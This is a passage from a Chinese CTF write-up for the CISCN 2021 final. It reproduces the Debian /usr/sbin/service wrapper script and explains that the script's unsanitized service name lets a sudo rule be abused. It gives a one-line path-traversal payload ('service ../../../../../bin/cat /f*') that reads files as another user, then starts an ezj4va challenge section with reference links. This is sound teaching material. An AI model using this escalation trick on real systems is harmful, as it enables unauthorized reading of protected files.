class="line">219</span><br><span class="line">220</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#!/bin/sh</span></span><br><span class="line"></span><br><span class="line"><span class="comment">###########################################################################</span></span><br><span class="line"><span class="comment"># /usr/bin/service</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment"># A convenient wrapper for the /etc/init.d init scripts.</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment"># This script is a modified version of the /sbin/service utility found on</span></span><br><span class="line"><span class="comment"># Red Hat/Fedora systems (licensed GPLv2+).</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment"># Copyright (C) 2006 Red Hat, Inc. All rights reserved.</span></span><br><span class="line"><span class="comment"># Copyright (C) 2008 Canonical Ltd.</span></span><br><span class="line"><span class="comment">#   * August 2008 - Dustin Kirkland &lt;kirkland@canonical.com&gt;</span></span><br><span class="line"><span class="comment"># Copyright (C) 2013 Michael Stapelberg &lt;stapelberg@debian.org&gt;</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment"># This program is free software; you can redistribute it and/or modify</span></span><br><span class="line"><span class="comment"># it under the terms of the GNU General Public License as published by</span></span><br><span class="line"><span class="comment"># the Free Software Foundation; either version 2 of the License, or</span></span><br><span class="line"><span class="comment"># (at your option) any later version.</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment"># This program is distributed in the hope that it will be useful,</span></span><br><span class="line"><span class="comment"># but WITHOUT ANY WARRANTY; without even the implied warranty of</span></span><br><span class="line"><span class="comment"># MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the</span></span><br><span class="line"><span class="comment"># GNU General Public License for more details.</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment"># You should have received a copy of the GNU General Public License</span></span><br><span class="line"><span class="comment"># along with this program; if not, write to the Free Software</span></span><br><span class="line"><span class="comment"># Foundation, Inc., 59 Temple Place, Suite 330, Boston, MA  02111-1307  USA</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment"># On Debian GNU/Linux systems, the complete text of the GNU General</span></span><br><span class="line"><span class="comment"># Public License can be found in `/usr/share/common-licenses/GPL-2&#x27;.</span></span><br><span class="line"><span class="comment">###########################################################################</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="title">is_ignored_file</span></span>() &#123;</span><br><span class="line">        <span class="keyword">case</span> <span class="string">&quot;<span class="variable">$1</span>&quot;</span> <span class="keyword">in</span></span><br><span class="line">                skeleton | README | *.dpkg-dist | *.dpkg-old | rc | rcS | single | reboot | bootclean.sh)</span><br><span class="line">                        <span class="built_in">return</span> 0</span><br><span class="line">                ;;</span><br><span class="line">        <span class="keyword">esac</span></span><br><span class="line">        <span class="built_in">return</span> 1</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">VERSION=<span class="string">&quot;`basename <span class="variable">$0</span>` ver. 1.56+nmu1&quot;</span></span><br><span class="line">USAGE=<span class="string">&quot;Usage: `basename <span class="variable">$0</span>` &lt; option &gt; | --status-all | \</span></span><br><span class="line"><span class="string">[ service_name [ command | --full-restart ] ]&quot;</span></span><br><span class="line">SERVICE=</span><br><span class="line">ACTION=</span><br><span class="line">SERVICEDIR=<span class="string">&quot;/etc/init.d&quot;</span></span><br><span class="line">OPTIONS=</span><br><span class="line">is_systemd=</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> [ <span class="variable">$#</span> -eq 0 ]; <span class="keyword">then</span></span><br><span class="line">   <span class="built_in">echo</span> <span class="string">&quot;<span class="variable">$&#123;USAGE&#125;</span>&quot;</span> &gt;&amp;2</span><br><span class="line">   <span class="built_in">exit</span> 1</span><br><span class="line"><span class="keyword">fi</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> [ -d /run/systemd/system ]; <span class="keyword">then</span></span><br><span class="line">   is_systemd=1</span><br><span class="line"><span class="keyword">fi</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">cd</span> /</span><br><span class="line"><span class="keyword">while</span> [ <span class="variable">$#</span> -gt 0 ]; <span class="keyword">do</span></span><br><span class="line">  <span class="keyword">case</span> <span class="string">&quot;<span class="variable">$&#123;1&#125;</span>&quot;</span> <span class="keyword">in</span></span><br><span class="line">    --<span class="built_in">help</span> | -h | --h* )</span><br><span class="line">       <span class="built_in">echo</span> <span class="string">&quot;<span class="variable">$&#123;USAGE&#125;</span>&quot;</span> &gt;&amp;2</span><br><span class="line">       <span class="built_in">exit</span> 0</span><br><span class="line">       ;;</span><br><span class="line">    --version | -V )</span><br><span class="line">       <span class="built_in">echo</span> <span class="string">&quot;<span class="variable">$&#123;VERSION&#125;</span>&quot;</span> &gt;&amp;2</span><br><span class="line">       <span class="built_in">exit</span> 0</span><br><span class="line">       ;;</span><br><span class="line">    *)</span><br><span class="line">       <span class="keyword">if</span> [ -z <span class="string">&quot;<span class="variable">$&#123;SERVICE&#125;</span>&quot;</span> -a <span class="variable">$#</span> -eq 1 -a <span class="string">&quot;<span class="variable">$&#123;1&#125;</span>&quot;</span> = <span class="string">&quot;--status-all&quot;</span> ]; <span class="keyword">then</span></span><br><span class="line">          <span class="built_in">cd</span> <span class="variable">$&#123;SERVICEDIR&#125;</span></span><br><span class="line">          <span class="keyword">for</span> SERVICE <span class="keyword">in</span> * ; <span class="keyword">do</span></span><br><span class="line">            <span class="keyword">case</span> <span class="string">&quot;<span class="variable">$&#123;SERVICE&#125;</span>&quot;</span> <span class="keyword">in</span></span><br><span class="line">              <span class="built_in">functions</span> | halt | killall | single| linuxconf| kudzu)</span><br><span class="line">                  ;;</span><br><span class="line">              *)</span><br><span class="line">                <span class="keyword">if</span> ! is_ignored_file <span class="string">&quot;<span class="variable">$&#123;SERVICE&#125;</span>&quot;</span> \</span><br><span class="line">                    &amp;&amp; [ -x <span class="string">&quot;<span class="variable">$&#123;SERVICEDIR&#125;</span>/<span class="variable">$&#123;SERVICE&#125;</span>&quot;</span> ]; <span class="keyword">then</span></span><br><span class="line">                        out=$(env -i LANG=<span class="string">&quot;<span class="variable">$LANG</span>&quot;</span> LANGUAGE=<span class="string">&quot;<span class="variable">$LANGUAGE</span>&quot;</span> LC_CTYPE=<span class="string">&quot;<span class="variable">$LC_CTYPE</span>&quot;</span> LC_NUMERIC=<span class="string">&quot;<span class="variable">$LC_NUMERIC</span>&quot;</span> LC_TIME=<span class="string">&quot;<span class="variable">$LC_TIME</span>&quot;</span> LC_COLLATE=<span class="string">&quot;<span class="variable">$LC_COLLATE</span>&quot;</span> LC_MONETARY=<span class="string">&quot;<span class="variable">$LC_MONETARY</span>&quot;</span> LC_MESSAGES=<span class="string">&quot;<span class="variable">$LC_MESSAGES</span>&quot;</span> LC_PAPER=<span class="string">&quot;<span class="variable">$LC_PAPER</span>&quot;</span> LC_NAME=<span class="string">&quot;<span class="variable">$LC_NAME</span>&quot;</span> LC_ADDRESS=<span class="string">&quot;<span class="variable">$LC_ADDRESS</span>&quot;</span> LC_TELEPHONE=<span class="string">&quot;<span class="variable">$LC_TELEPHONE</span>&quot;</span> LC_MEASUREMENT=<span class="string">&quot;<span class="variable">$LC_MEASUREMENT</span>&quot;</span> LC_IDENTIFICATION=<span class="string">&quot;<span class="variable">$LC_IDENTIFICATION</span>&quot;</span> LC_ALL=<span class="string">&quot;<span class="variable">$LC_ALL</span>&quot;</span> PATH=<span class="string">&quot;<span class="variable">$PATH</span>&quot;</span> TERM=<span class="string">&quot;<span class="variable">$TERM</span>&quot;</span> <span class="string">&quot;<span class="variable">$SERVICEDIR</span>/<span class="variable">$SERVICE</span>&quot;</span> status 2&gt;&amp;1)</span><br><span class="line">                        retval=$?</span><br><span class="line">                        <span class="keyword">if</span> <span class="built_in">echo</span> <span class="string">&quot;<span class="variable">$out</span>&quot;</span> | egrep -iq <span class="string">&quot;usage:&quot;</span>; <span class="keyword">then</span></span><br><span class="line">                          <span class="comment">#printf &quot; %s %-60s %s\n&quot; &quot;[?]&quot; &quot;$SERVICE:&quot; &quot;unknown&quot; 1&gt;&amp;2</span></span><br><span class="line">                          <span class="built_in">echo</span> <span class="string">&quot; [ ? ]  <span class="variable">$SERVICE</span>&quot;</span> 1&gt;&amp;2</span><br><span class="line">                          <span class="built_in">continue</span></span><br><span class="line">                        <span class="keyword">else</span></span><br><span class="line">                          <span class="keyword">if</span> [ <span class="string">&quot;<span class="variable">$retval</span>&quot;</span> = <span class="string">&quot;0&quot;</span> -a -n <span class="string">&quot;<span class="variable">$out</span>&quot;</span> ]; <span class="keyword">then</span></span><br><span class="line">                            <span class="comment">#printf &quot; %s %-60s %s\n&quot; &quot;[+]&quot; &quot;$SERVICE:&quot; &quot;running&quot;</span></span><br><span class="line">                            <span class="built_in">echo</span> <span class="string">&quot; [ + ]  <span class="variable">$SERVICE</span>&quot;</span></span><br><span class="line">                            <span class="built_in">continue</span></span><br><span class="line">                          <span class="keyword">else</span></span><br><span class="line">                            <span class="comment">#printf &quot; %s %-60s %s\n&quot; &quot;[-]&quot; &quot;$SERVICE:&quot; &quot;NOT running&quot;</span></span><br><span class="line">                            <span class="built_in">echo</span> <span class="string">&quot; [ - ]  <span class="variable">$SERVICE</span>&quot;</span></span><br><span class="line">                            <span class="built_in">continue</span></span><br><span class="line">                          <span class="keyword">fi</span></span><br><span class="line">                        <span class="keyword">fi</span></span><br><span class="line">                  <span class="comment">#env -i LANG=&quot;$LANG&quot; LANGUAGE=&quot;$LANGUAGE&quot; LC_CTYPE=&quot;$LC_CTYPE&quot; LC_NUMERIC=&quot;$LC_NUMERIC&quot; LC_TIME=&quot;$LC_TIME&quot; LC_COLLATE=&quot;$LC_COLLATE&quot; LC_MONETARY=&quot;$LC_MONETARY&quot; LC_MESSAGES=&quot;$LC_MESSAGES&quot; LC_PAPER=&quot;$LC_PAPER&quot; LC_NAME=&quot;$LC_NAME&quot; LC_ADDRESS=&quot;$LC_ADDRESS&quot; LC_TELEPHONE=&quot;$LC_TELEPHONE&quot; LC_MEASUREMENT=&quot;$LC_MEASUREMENT&quot; LC_IDENTIFICATION=&quot;$LC_IDENTIFICATION&quot; LC_ALL=&quot;$LC_ALL&quot; PATH=&quot;$PATH&quot; TERM=&quot;$TERM&quot; &quot;$SERVICEDIR/$SERVICE&quot; status</span></span><br><span class="line">                <span class="keyword">fi</span></span><br><span class="line">                ;;</span><br><span class="line">            <span class="keyword">esac</span></span><br><span class="line">          <span class="keyword">done</span></span><br><span class="line">          <span class="built_in">exit</span> 0</span><br><span class="line">       <span class="keyword">elif</span> [ <span class="variable">$#</span> -eq 2 -a <span class="string">&quot;<span class="variable">$&#123;2&#125;</span>&quot;</span> = <span class="string">&quot;--full-restart&quot;</span> ]; <span class="keyword">then</span></span><br><span class="line">          SERVICE=<span class="string">&quot;<span class="variable">$&#123;1&#125;</span>&quot;</span></span><br><span class="line">          <span class="comment"># On systems using systemd, we just perform a normal restart:</span></span><br><span class="line">          <span class="comment"># A restart with systemd is already a full restart.</span></span><br><span class="line">          <span class="keyword">if</span> [ -n <span class="string">&quot;<span class="variable">$is_systemd</span>&quot;</span> ]; <span class="keyword">then</span></span><br><span class="line">             ACTION=<span class="string">&quot;restart&quot;</span></span><br><span class="line">          <span class="keyword">else</span></span><br><span class="line">             <span class="keyword">if</span> [ -x <span class="string">&quot;<span class="variable">$&#123;SERVICEDIR&#125;</span>/<span class="variable">$&#123;SERVICE&#125;</span>&quot;</span> ]; <span class="keyword">then</span></span><br><span class="line">               env -i LANG=<span class="string">&quot;<span class="variable">$LANG</span>&quot;</span> LANGUAGE=<span class="string">&quot;<span class="variable">$LANGUAGE</span>&quot;</span> LC_CTYPE=<span class="string">&quot;<span class="variable">$LC_CTYPE</span>&quot;</span> LC_NUMERIC=<span class="string">&quot;<span class="variable">$LC_NUMERIC</span>&quot;</span> LC_TIME=<span class="string">&quot;<span class="variable">$LC_TIME</span>&quot;</span> LC_COLLATE=<span class="string">&quot;<span class="variable">$LC_COLLATE</span>&quot;</span> LC_MONETARY=<span class="string">&quot;<span class="variable">$LC_MONETARY</span>&quot;</span> LC_MESSAGES=<span class="string">&quot;<span class="variable">$LC_MESSAGES</span>&quot;</span> LC_PAPER=<span class="string">&quot;<span class="variable">$LC_PAPER</span>&quot;</span> LC_NAME=<span class="string">&quot;<span class="variable">$LC_NAME</span>&quot;</span> LC_ADDRESS=<span class="string">&quot;<span class="variable">$LC_ADDRESS</span>&quot;</span> LC_TELEPHONE=<span class="string">&quot;<span class="variable">$LC_TELEPHONE</span>&quot;</span> LC_MEASUREMENT=<span class="string">&quot;<span class="variable">$LC_MEASUREMENT</span>&quot;</span> LC_IDENTIFICATION=<span class="string">&quot;<span class="variable">$LC_IDENTIFICATION</span>&quot;</span> LC_ALL=<span class="string">&quot;<span class="variable">$LC_ALL</span>&quot;</span> PATH=<span class="string">&quot;<span class="variable">$PATH</span>&quot;</span> TERM=<span class="string">&quot;<span class="variable">$TERM</span>&quot;</span> <span class="string">&quot;<span class="variable">$SERVICEDIR</span>/<span class="variable">$SERVICE</span>&quot;</span> stop</span><br><span class="line">               env -i LANG=<span class="string">&quot;<span class="variable">$LANG</span>&quot;</span> LANGUAGE=<span class="string">&quot;<span class="variable">$LANGUAGE</span>&quot;</span> LC_CTYPE=<span class="string">&quot;<span class="variable">$LC_CTYPE</span>&quot;</span> LC_NUMERIC=<span class="string">&quot;<span class="variable">$LC_NUMERIC</span>&quot;</span> LC_TIME=<span class="string">&quot;<span class="variable">$LC_TIME</span>&quot;</span> LC_COLLATE=<span class="string">&quot;<span class="variable">$LC_COLLATE</span>&quot;</span> LC_MONETARY=<span class="string">&quot;<span class="variable">$LC_MONETARY</span>&quot;</span> LC_MESSAGES=<span class="string">&quot;<span class="variable">$LC_MESSAGES</span>&quot;</span> LC_PAPER=<span class="string">&quot;<span class="variable">$LC_PAPER</span>&quot;</span> LC_NAME=<span class="string">&quot;<span class="variable">$LC_NAME</span>&quot;</span> LC_ADDRESS=<span class="string">&quot;<span class="variable">$LC_ADDRESS</span>&quot;</span> LC_TELEPHONE=<span class="string">&quot;<span class="variable">$LC_TELEPHONE</span>&quot;</span> LC_MEASUREMENT=<span class="string">&quot;<span class="variable">$LC_MEASUREMENT</span>&quot;</span> LC_IDENTIFICATION=<span class="string">&quot;<span class="variable">$LC_IDENTIFICATION</span>&quot;</span> LC_ALL=<span class="string">&quot;<span class="variable">$LC_ALL</span>&quot;</span> PATH=<span class="string">&quot;<span class="variable">$PATH</span>&quot;</span> TERM=<span class="string">&quot;<span class="variable">$TERM</span>&quot;</span> <span class="string">&quot;<span class="variable">$SERVICEDIR</span>/<span class="variable">$SERVICE</span>&quot;</span> start</span><br><span class="line">               <span class="built_in">exit</span> $?</span><br><span class="line">             <span class="keyword">fi</span></span><br><span class="line">          <span class="keyword">fi</span></span><br><span class="line">       <span class="keyword">elif</span> [ -z <span class="string">&quot;<span class="variable">$&#123;SERVICE&#125;</span>&quot;</span> ]; <span class="keyword">then</span></span><br><span class="line">         SERVICE=<span class="string">&quot;<span class="variable">$&#123;1&#125;</span>&quot;</span></span><br><span class="line">       <span class="keyword">elif</span> [ -z <span class="string">&quot;<span class="variable">$&#123;ACTION&#125;</span>&quot;</span> ]; <span class="keyword">then</span></span><br><span class="line">         ACTION=<span class="string">&quot;<span class="variable">$&#123;1&#125;</span>&quot;</span></span><br><span class="line">       <span class="keyword">else</span></span><br><span class="line">         OPTIONS=<span class="string">&quot;<span class="variable">$&#123;OPTIONS&#125;</span> <span class="variable">$&#123;1&#125;</span>&quot;</span></span><br><span class="line">       <span class="keyword">fi</span></span><br><span class="line">       <span class="built_in">shift</span></span><br><span class="line">       ;;</span><br><span class="line">   <span class="keyword">esac</span></span><br><span class="line"><span class="keyword">done</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="title">run_via_sysvinit</span></span>() &#123;</span><br><span class="line">   <span class="comment"># Otherwise, use the traditional sysvinit</span></span><br><span class="line">   <span class="keyword">if</span> [ -x <span class="string">&quot;<span class="variable">$&#123;SERVICEDIR&#125;</span>/<span class="variable">$&#123;SERVICE&#125;</span>&quot;</span> ]; <span class="keyword">then</span></span><br><span class="line">      <span class="built_in">exec</span> env -i LANG=<span class="string">&quot;<span class="variable">$LANG</span>&quot;</span> LANGUAGE=<span class="string">&quot;<span class="variable">$LANGUAGE</span>&quot;</span> LC_CTYPE=<span class="string">&quot;<span class="variable">$LC_CTYPE</span>&quot;</span> LC_NUMERIC=<span class="string">&quot;<span class="variable">$LC_NUMERIC</span>&quot;</span> LC_TIME=<span class="string">&quot;<span class="variable">$LC_TIME</span>&quot;</span> LC_COLLATE=<span class="string">&quot;<span class="variable">$LC_COLLATE</span>&quot;</span> LC_MONETARY=<span class="string">&quot;<span class="variable">$LC_MONETARY</span>&quot;</span> LC_MESSAGES=<span class="string">&quot;<span class="variable">$LC_MESSAGES</span>&quot;</span> LC_PAPER=<span class="string">&quot;<span class="variable">$LC_PAPER</span>&quot;</span> LC_NAME=<span class="string">&quot;<span class="variable">$LC_NAME</span>&quot;</span> LC_ADDRESS=<span class="string">&quot;<span class="variable">$LC_ADDRESS</span>&quot;</span> LC_TELEPHONE=<span class="string">&quot;<span class="variable">$LC_TELEPHONE</span>&quot;</span> LC_MEASUREMENT=<span class="string">&quot;<span class="variable">$LC_MEASUREMENT</span>&quot;</span> LC_IDENTIFICATION=<span class="string">&quot;<span class="variable">$LC_IDENTIFICATION</span>&quot;</span> LC_ALL=<span class="string">&quot;<span class="variable">$LC_ALL</span>&quot;</span> PATH=<span class="string">&quot;<span class="variable">$PATH</span>&quot;</span> TERM=<span class="string">&quot;<span class="variable">$TERM</span>&quot;</span> <span class="string">&quot;<span class="variable">$SERVICEDIR</span>/<span class="variable">$SERVICE</span>&quot;</span> <span class="variable">$&#123;ACTION&#125;</span> <span class="variable">$&#123;OPTIONS&#125;</span></span><br><span class="line">   <span class="keyword">else</span></span><br><span class="line">      <span class="built_in">echo</span> <span class="string">&quot;<span class="variable">$&#123;SERVICE&#125;</span>: unrecognized service&quot;</span> &gt;&amp;2</span><br><span class="line">      <span class="built_in">exit</span> 1</span><br><span class="line">   <span class="keyword">fi</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="title">update_openrc_started_symlinks</span></span>() &#123;</span><br><span class="line">   <span class="comment"># maintain the symlinks of /run/openrc/started so that</span></span><br><span class="line">   <span class="comment"># rc-status works with the service command as well</span></span><br><span class="line">   <span class="keyword">if</span> [ -d /run/openrc/started ] ; <span class="keyword">then</span></span><br><span class="line">      <span class="keyword">case</span> <span class="string">&quot;<span class="variable">$&#123;ACTION&#125;</span>&quot;</span> <span class="keyword">in</span></span><br><span class="line">      start)</span><br><span class="line">         <span class="keyword">if</span> [ ! -h /run/openrc/started/<span class="variable">$SERVICE</span> ] ; <span class="keyword">then</span></span><br><span class="line">            ln -s <span class="variable">$SERVICEDIR</span>/<span class="variable">$SERVICE</span> /run/openrc/started/<span class="variable">$SERVICE</span> || <span class="literal">true</span></span><br><span class="line">         <span class="keyword">fi</span></span><br><span class="line">      ;;</span><br><span class="line">      stop)</span><br><span class="line">         rm /run/openrc/started/<span class="variable">$SERVICE</span> || <span class="literal">true</span></span><br><span class="line">      ;;</span><br><span class="line">      <span class="keyword">esac</span></span><br><span class="line">   <span class="keyword">fi</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment"># When this machine is running systemd, standard service calls are turned into</span></span><br><span class="line"><span class="comment"># systemctl calls.</span></span><br><span class="line"><span class="keyword">if</span> [ -n <span class="string">&quot;<span class="variable">$is_systemd</span>&quot;</span> ]</span><br><span class="line"><span class="keyword">then</span></span><br><span class="line">   UNIT=<span class="string">&quot;<span class="variable">$&#123;SERVICE%.sh&#125;</span>.service&quot;</span></span><br><span class="line">   <span class="comment"># avoid deadlocks during bootup and shutdown from units/hooks</span></span><br><span class="line">   <span class="comment"># which call &quot;invoke-rc.d service reload&quot; and similar, since</span></span><br><span class="line">   <span class="comment"># the synchronous wait plus systemd&#x27;s normal behaviour of</span></span><br><span class="line">   <span class="comment"># transactionally processing all dependencies first easily</span></span><br><span class="line">   <span class="comment"># causes dependency loops</span></span><br><span class="line">   <span class="keyword">if</span> ! systemctl --quiet is-active multi-user.target; <span class="keyword">then</span></span><br><span class="line">       sctl_args=<span class="string">&quot;--job-mode=ignore-dependencies&quot;</span></span><br><span class="line">   <span class="keyword">fi</span></span><br><span class="line"></span><br><span class="line">   <span class="keyword">case</span> <span class="string">&quot;<span class="variable">$&#123;ACTION&#125;</span>&quot;</span> <span class="keyword">in</span></span><br><span class="line">      restart|status|try-restart)</span><br><span class="line">         <span class="built_in">exec</span> systemctl <span class="variable">$sctl_args</span> <span class="variable">$&#123;ACTION&#125;</span> <span class="variable">$&#123;UNIT&#125;</span></span><br><span class="line">      ;;</span><br><span class="line">      start|stop)</span><br><span class="line">         <span class="comment"># Follow the principle of least surprise for SysV people:</span></span><br><span class="line">         <span class="comment"># When running &quot;service foo stop&quot; and foo happens to be a service that</span></span><br><span class="line">         <span class="comment"># has one or more .socket files, we also stop the .socket units.</span></span><br><span class="line">         <span class="comment"># Users who need more control will use systemctl directly.</span></span><br><span class="line">         <span class="keyword">for</span> unit <span class="keyword">in</span> $(systemctl list-unit-files --full --<span class="built_in">type</span>=socket 2&gt;/dev/null | sed -ne <span class="string">&#x27;s/\.socket\s*[a-z]*\s*$/.socket/p&#x27;</span>); <span class="keyword">do</span></span><br><span class="line">             <span class="keyword">if</span> [ <span class="string">&quot;<span class="subst">$(systemctl -p Triggers show $unit)</span>&quot;</span> = <span class="string">&quot;Triggers=<span class="variable">$&#123;UNIT&#125;</span>&quot;</span> ]; <span class="keyword">then</span></span><br><span class="line">                systemctl <span class="variable">$sctl_args</span> <span class="variable">$&#123;ACTION&#125;</span> <span class="variable">$unit</span></span><br><span class="line">             <span class="keyword">fi</span></span><br><span class="line">         <span class="keyword">done</span></span><br><span class="line">         <span class="built_in">exec</span> systemctl <span class="variable">$sctl_args</span> <span class="variable">$&#123;ACTION&#125;</span> <span class="variable">$&#123;UNIT&#125;</span></span><br><span class="line">      ;;</span><br><span class="line">      reload)</span><br><span class="line">         _canreload=<span class="string">&quot;<span class="subst">$(systemctl -p CanReload show $&#123;UNIT&#125; 2&gt;/dev/null)</span>&quot;</span></span><br><span class="line">         <span class="keyword">if</span> [ <span class="string">&quot;<span class="variable">$_canreload</span>&quot;</span> = <span class="string">&quot;CanReload=no&quot;</span> ]; <span class="keyword">then</span></span><br><span class="line">            <span class="comment"># The reload action falls back to the sysv init script just in case</span></span><br><span class="line">            <span class="comment"># the systemd service file does not (yet) support reload for a</span></span><br><span class="line">            <span class="comment"># specific service.</span></span><br><span class="line">            run_via_sysvinit</span><br><span class="line">         <span class="keyword">else</span></span><br><span class="line">            <span class="built_in">exec</span> systemctl <span class="variable">$sctl_args</span> reload <span class="string">&quot;<span class="variable">$&#123;UNIT&#125;</span>&quot;</span></span><br><span class="line">         <span class="keyword">fi</span></span><br><span class="line">         ;;</span><br><span class="line">      force-stop)</span><br><span class="line">         <span class="built_in">exec</span> systemctl --signal=KILL <span class="built_in">kill</span> <span class="string">&quot;<span class="variable">$&#123;UNIT&#125;</span>&quot;</span></span><br><span class="line">         ;;</span><br><span class="line">      force-reload)</span><br><span class="line">         _canreload=<span class="string">&quot;<span class="subst">$(systemctl -p CanReload show $&#123;UNIT&#125; 2&gt;/dev/null)</span>&quot;</span></span><br><span class="line">         <span class="keyword">if</span> [ <span class="string">&quot;<span class="variable">$_canreload</span>&quot;</span> = <span class="string">&quot;CanReload=no&quot;</span> ]; <span class="keyword">then</span></span><br><span class="line">            <span class="built_in">exec</span> systemctl <span class="variable">$sctl_args</span> restart <span class="string">&quot;<span class="variable">$&#123;UNIT&#125;</span>&quot;</span></span><br><span class="line">         <span class="keyword">else</span></span><br><span class="line">            <span class="built_in">exec</span> systemctl <span class="variable">$sctl_args</span> reload <span class="string">&quot;<span class="variable">$&#123;UNIT&#125;</span>&quot;</span></span><br><span class="line">         <span class="keyword">fi</span></span><br><span class="line">         ;;</span><br><span class="line">      *)</span><br><span class="line">         <span class="comment"># We try to run non-standard actions by running</span></span><br><span class="line">         <span class="comment"># the init script directly.</span></span><br><span class="line">         run_via_sysvinit</span><br><span class="line">         ;;</span><br><span class="line">   <span class="keyword">esac</span></span><br><span class="line"><span class="keyword">fi</span></span><br><span class="line"></span><br><span class="line">update_openrc_started_symlinks</span><br><span class="line">run_via_sysvinit</span><br></pre></td></tr></table></figure>
+
+<p>如果命令打的是</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo -u dragon_lord /usr/sbin/service hello</span><br></pre></td></tr></table></figure>
+
+<p>120行 就会执行</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">elif</span> [ -z <span class="string">&quot;<span class="variable">$&#123;SERVICE&#125;</span>&quot;</span> ]; <span class="keyword">then</span></span><br><span class="line">  SERVICE=<span class="string">&quot;<span class="variable">$&#123;1&#125;</span>&quot;</span></span><br></pre></td></tr></table></figure>
+
+<p>SERVICE 被赋值为 hello</p>
+<p>然后最后调用 run_via_sysvinit 函数</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="title">run_via_sysvinit</span></span>() &#123;</span><br><span class="line">   <span class="comment"># Otherwise, use the traditional sysvinit</span></span><br><span class="line">   <span class="keyword">if</span> [ -x <span class="string">&quot;<span class="variable">$&#123;SERVICEDIR&#125;</span>/<span class="variable">$&#123;SERVICE&#125;</span>&quot;</span> ]; <span class="keyword">then</span></span><br><span class="line">      <span class="built_in">exec</span> env -i LANG=<span class="string">&quot;<span class="variable">$LANG</span>&quot;</span> LANGUAGE=<span class="string">&quot;<span class="variable">$LANGUAGE</span>&quot;</span> LC_CTYPE=<span class="string">&quot;<span class="variable">$LC_CTYPE</span>&quot;</span> LC_NUMERIC=<span class="string">&quot;<span class="variable">$LC_NUMERIC</span>&quot;</span> LC_TIME=<span class="string">&quot;<span class="variable">$LC_TIME</span>&quot;</span> LC_COLLATE=<span class="string">&quot;<span class="variable">$LC_COLLATE</span>&quot;</span> LC_MONETARY=<span class="string">&quot;<span class="variable">$LC_MONETARY</span>&quot;</span> LC_MESSAGES=<span class="string">&quot;<span class="variable">$LC_MESSAGES</span>&quot;</span> LC_PAPER=<span class="string">&quot;<span class="variable">$LC_PAPER</span>&quot;</span> LC_NAME=<span class="string">&quot;<span class="variable">$LC_NAME</span>&quot;</span> LC_ADDRESS=<span class="string">&quot;<span class="variable">$LC_ADDRESS</span>&quot;</span> LC_TELEPHONE=<span class="string">&quot;<span class="variable">$LC_TELEPHONE</span>&quot;</span> LC_MEASUREMENT=<span class="string">&quot;<span class="variable">$LC_MEASUREMENT</span>&quot;</span> LC_IDENTIFICATION=<span class="string">&quot;<span class="variable">$LC_IDENTIFICATION</span>&quot;</span> LC_ALL=<span class="string">&quot;<span class="variable">$LC_ALL</span>&quot;</span> PATH=<span class="string">&quot;<span class="variable">$PATH</span>&quot;</span> TERM=<span class="string">&quot;<span class="variable">$TERM</span>&quot;</span> <span class="string">&quot;<span class="variable">$SERVICEDIR</span>/<span class="variable">$SERVICE</span>&quot;</span> <span class="variable">$&#123;ACTION&#125;</span> <span class="variable">$&#123;OPTIONS&#125;</span></span><br><span class="line">   <span class="keyword">else</span></span><br><span class="line">      <span class="built_in">echo</span> <span class="string">&quot;<span class="variable">$&#123;SERVICE&#125;</span>: unrecognized service&quot;</span> &gt;&amp;2</span><br><span class="line">      <span class="built_in">exit</span> 1</span><br><span class="line">   <span class="keyword">fi</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>开了个 env 并在这个 env 中执行了 <code>$SERVICEDIR/$SERVICE</code></p>
+<p>而在 49行</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SERVICEDIR&#x3D;&quot;&#x2F;etc&#x2F;init.d&quot;</span><br></pre></td></tr></table></figure>
+
+<p>下面的payload即可得到flag</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo -u dragon_lord /usr/sbin/service ../../../../../bin/cat /f*</span><br></pre></td></tr></table></figure>
+
+<h3 id="ezj4va"><a href="#ezj4va" class="headerlink" title="ezj4va"></a>ezj4va</h3><p>参考：</p>
+<p><a target="_blank" rel="noopener" href="https://www.anquanke.com/post/id/249651">https://www.anquanke.com/post/id/249651</a></p>
+<p><a target="_blank" rel="noopener" href="http://w4nder.top/?p=497">http://w4nder.top/?p=497</a></p>
+<p><a target="_blank" rel="noopener" href="http://www.yang99.top/index.php/archives/68/#%E6%94%BB%E5%87%BB">http://www.yang99.top/index.php/archives/68/#%E6%94%BB%E5%87%BB</a></p>
+<p><a target="_blank" rel="noopener" href="http://www.zip有源码/">www.zip有源码</a></p>
+<p><img src="/2021/08/30/%E6%AF%94%E8%B5%9B/2021/ciscn-final%E5%A4%8D%E7%8E%B0writeup/image-20210902181655785.png" alt="image-20210902181655785"></p>
+<p>在ciscn/fina1/ezj4va/service/impl/CartServiceImpl.java</p>
